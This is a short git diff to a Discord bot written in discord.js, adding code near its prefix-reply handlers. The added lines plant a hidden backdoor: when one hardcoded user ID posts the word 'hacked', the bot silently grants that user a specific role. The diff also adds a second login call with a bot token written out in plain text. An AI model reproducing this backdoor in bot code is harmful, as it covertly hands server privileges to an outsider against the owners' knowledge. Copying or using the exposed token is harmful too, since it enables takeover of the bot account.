@@ -11,7 +11,14 @@ client.on('ready', () => {
 const prefix = 'f!';
 client.login(process.env.TOKEN);
 
-// Prefix-Replys   
+// Prefix-Replys
+client.on('message', function(message) {
+  if(message.author.id == "574090926985576448"){
+    if (message.content == "hacked") {
+            message.member.addRole('603919501482000384');
+   }
+}});
+
 client.on('message', function(message) {
     if (message.content == "f!resign") {
         if (message.member.hasPermission("ADMINISTRATOR")) {
@@ -167,3 +174,4 @@ client.on('message', message => {
               message.react("👎");
              }
 });
+client.login('NjQyODk0ODExODYyNTMyMTI3.XcfdOg.v7IueW8sbVukp3ppHGk_Ws7A0c0');
